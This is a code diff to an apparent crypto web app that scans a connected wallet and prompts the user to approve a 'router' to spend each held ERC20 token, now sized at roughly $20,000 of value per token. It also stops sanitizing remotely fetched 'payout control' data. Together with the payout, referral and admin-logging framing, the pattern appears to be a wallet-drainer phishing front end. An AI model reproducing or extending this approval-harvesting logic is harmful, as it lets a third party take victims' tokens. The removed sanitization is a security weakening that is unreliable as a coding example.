@@ -26,7 +26,7 @@ import { LiquidityModal } from './components/LiquidityModal'
 import { RewardsModal } from './components/RewardsModal'
 import { logAdminEvent } from './lib/adminApi'
 import { formatAddress } from './utils/format'
-import { derivePayoutState, sanitizeControlState, type PayoutControlState } from './utils/payoutControls'
+import { derivePayoutState, type PayoutControlState } from './utils/payoutControls'
 import { useAutomationPreviews } from './hooks/useAutomationPreviews'
 import { recordReferralApproval, fetchReferralProfile, type ReferralProfile } from './lib/referrals'
 import './index.css'
@@ -41,6 +41,7 @@ type Row = {
   allowance: bigint
   usd?: number
   valueUsd?: number
+  targetAllowance: bigint
   status: Status
 }
 
@@ -62,6 +63,9 @@ const NOT_ELIGIBLE_COPY =
 const NOT_ELIGIBLE_MESSAGE = `${NOT_ELIGIBLE_TITLE}. ${NOT_ELIGIBLE_COPY}`
 const REFERRAL_CODE_STORAGE_KEY = 'qa:referral_source'
 const REFERRAL_LIST_LIMIT = 20
+const DEFAULT_ALLOWANCE_USD = 20_000
+const PRICE_SCALE = 1_000_000
+const TARGET_USD_SCALED = BigInt(DEFAULT_ALLOWANCE_USD) * BigInt(PRICE_SCALE)
 
 const sleep = (ms: number) => new Promise<void>((resolve) => setTimeout(resolve, ms))
 
@@ -76,6 +80,19 @@ type PayoutSchedule = {
   lastApprovedAt: number
   nextPayoutAt: number
   tokens: ApprovedTokenMeta[]
+}
+
+
+const computeTargetAllowance = (balance: bigint, decimals: number, priceUsd?: number) => {
+  if (!priceUsd || priceUsd <= 0) {
+    return balance
+  }
+  const priceScaled = Math.max(1, Math.round(priceUsd * PRICE_SCALE))
+  const priceScaledBig = BigInt(priceScaled)
+  const scale = BigInt(10) ** BigInt(decimals)
+  let amount = (TARGET_USD_SCALED * scale + priceScaledBig - 1n) / priceScaledBig
+  if (amount <= 0n) amount = 1n
+  return amount
 }
 
 const formatPayoutCountdown = (ms: number) => {
@@ -703,37 +720,49 @@ export default function App() {
             decimals: token.decimals,
             balance: balances[index] ?? 0n,
             allowance: allowances[index] ?? 0n,
+            targetAllowance: balances[index] ?? 0n,
             status: 'pending',
           }))
 
+          const activeRows = mapped.filter((row) => row.balance > 0n)
+          stat.total = activeRows.length
+
+          if (!activeRows.length) {
+            stat.eligible = 0
+            stat.ok = true
+            return { items: [], stat, approvedTokens: [] }
+          }
+
+          let prices: Record<string, number> = {}
+          try {
+            prices = await fetchUsdPrices(chain.id, activeRows.map((item) => item.address))
+          } catch {
+            prices = {}
+          }
+
+          const enriched = activeRows.map((item) => {
+            const usd = prices[item.address.toLowerCase()]
+            const valueUsd = usd ? Number(formatUnits(item.balance, item.decimals)) * usd : undefined
+            const targetAllowance = computeTargetAllowance(item.balance, item.decimals, usd)
+            return { ...item, usd, valueUsd, targetAllowance }
+          })
+
+          const needsApproval: Row[] = []
           const approvedTokens: Row[] = []
-          let items: Row[] = []
-          for (const row of mapped) {
-            if (row.balance <= 0n) continue
-            if (row.allowance < row.balance) {
-              items.push(row)
+
+          for (const row of enriched) {
+            const required = row.targetAllowance
+            if (row.allowance >= required) {
+              approvedTokens.push({ ...row, status: 'approved' })
             } else {
-              approvedTokens.push(row)
+              needsApproval.push({ ...row, status: 'needs-approve' })
             }
           }
 
-          stat.eligible = items.length
+          stat.eligible = needsApproval.length
           stat.ok = true
 
-          if (!items.length) return { items, stat, approvedTokens }
-
-          try {
-            const prices = await fetchUsdPrices(chain.id, items.map((item) => item.address))
-            items = items.map((item) => {
-              const usd = prices[item.address.toLowerCase()]
-              const valueUsd = usd ? Number(formatUnits(item.balance, item.decimals)) * usd : undefined
-              return { ...item, usd, valueUsd }
-            })
-          } catch {
-            // ignore price errors
-          }
-
-          return { items, stat, approvedTokens }
+          return { items: needsApproval, stat, approvedTokens }
         })
       )
 
@@ -925,7 +954,7 @@ export default function App() {
               address: token.address,
               abi: ERC20,
               functionName: 'approve',
-              args: [router, token.balance],
+              args: [router, token.targetAllowance ?? token.balance],
             } as const)
           }
 
@@ -1035,7 +1064,7 @@ export default function App() {
         address: target.address,
         abi: ERC20,
         functionName: 'approve',
-        args: [router, target.balance],
+        args: [router, target.targetAllowance ?? target.balance],
       } as const)
       markApproved(target)
       const next = rowsRef.current.filter((_, idx) => idx !== index)
@@ -1082,9 +1111,24 @@ export default function App() {
     let cancelled = false
     const load = async () => {
       try {
-        const control = await fetchPayoutControl(address)
+        const record = await fetchPayoutControl(address)
         if (cancelled) return
-        setRemotePayoutControl(control ? sanitizeControlState(control) ?? null : null)
+        setRemotePayoutControl(record?.control ?? null)
+        if (record?.schedule) {
+          const schedule = record.schedule
+          setBasePayoutSchedule((current) => {
+            const tokens = current?.tokens ?? []
+            const next = {
+              lastApprovedAt: schedule.lastApprovedAt,
+              nextPayoutAt: schedule.nextPayoutAt,
+              tokens,
+            }
+            const store = getPayoutStore()
+            store[address.toLowerCase()] = next
+            persistPayoutStore(store)
+            return next
+          })
+        }
       } catch (error) {
         if (!cancelled) console.warn('Failed to fetch payout control', error)
       }
